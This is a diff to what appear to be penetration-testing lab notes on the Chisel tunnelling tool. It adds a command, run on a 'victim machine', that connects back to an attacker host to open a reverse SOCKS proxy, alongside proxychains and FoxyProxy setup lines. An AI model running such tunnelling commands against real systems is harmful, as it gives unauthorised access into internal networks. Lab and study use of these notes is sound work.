@@ -10,6 +10,7 @@ Chisel
 - On Victim machine:
 	- `./chisel client --fingerprint <fingerprint_from_server_node> <ip_address>:<server_port> R:socks`
 	- `.\chisel_windows.exe client --fingerprint gBlVNGJ8Ki/TR5iAy1+4OAvf8cN8MV+qQV7IVhzT+jA= 10.10.16.34:8080 R:socks`
+	- .\chisel.exe client --fingerprint P69UU4bfSlPZdQMJv7KVY120gBrinaSLzim+jSIR0v4= 10.10.16.2:9999 R:socks
  - Foxyproxy setup: (**1080 is default proxy port for reverse connections**)
  - Editing & Confirming proxychains.conf:
 	 - `socks5 127.0.0.1 1080`
